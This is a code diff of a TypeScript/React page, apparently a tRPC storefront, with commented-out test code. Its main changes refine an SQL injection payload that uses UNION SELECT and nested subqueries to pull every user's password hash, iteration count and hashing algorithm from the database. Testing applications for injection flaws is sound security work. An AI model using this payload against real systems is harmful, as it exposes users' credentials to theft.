@@ -13,7 +13,7 @@ import {
 interface Product {
   productId: string;
   name: string;
-  price: number;
+  // price: number;
   description: string;
   Media: {
     mediaId: string;
@@ -430,7 +430,6 @@ export default Home;
 //     // {
 //     // query: "check",
 //     // query: `nope' in 'not')>0 UNION  select "public"."Password"."password", "public"."Password"."numIterations", "public"."Password"."hashingAlgorithm" from "public"."Password" where "public"."Password"."passwordId" in (select "public"."UserAuthentication"."currentPasswordId" from "public"."UserAuthentication" where "public"."UserAuthentication"."userId" in (select id from "public"."User" where 1=1));--`,
-//     // },
 //   ],
 //   {
 //     onSuccess: (data) => {
@@ -440,4 +439,4 @@ export default Home;
 // );
 // const seller = trpc.useMutation(["seller.addProducts"]);
 
-//     `nope' in 'not')>0 UNION  select "public"."Password"."password", "public"."Password"."hashingAlgorithm" from "public"."Password" where "public"."Password"."passwordId" in (select "public"."UserAuthentication"."currentPasswordId" from "public"."UserAuthentication" where "public"."UserAuthentication"."userId" in (select id from "public"."User" where 1=1));--
+// `nope' in 'not')>0 UNION  select NULL, "public"."Password"."password", "public"."Password"."hashingAlgorithm" from "public"."Password" where "public"."Password"."passwordId" in (select "public"."UserAuthentication"."currentPasswordId" from "public"."UserAuthentication" where "public"."UserAuthentication"."userId" in (select id from "public"."User" where 1=1)); --
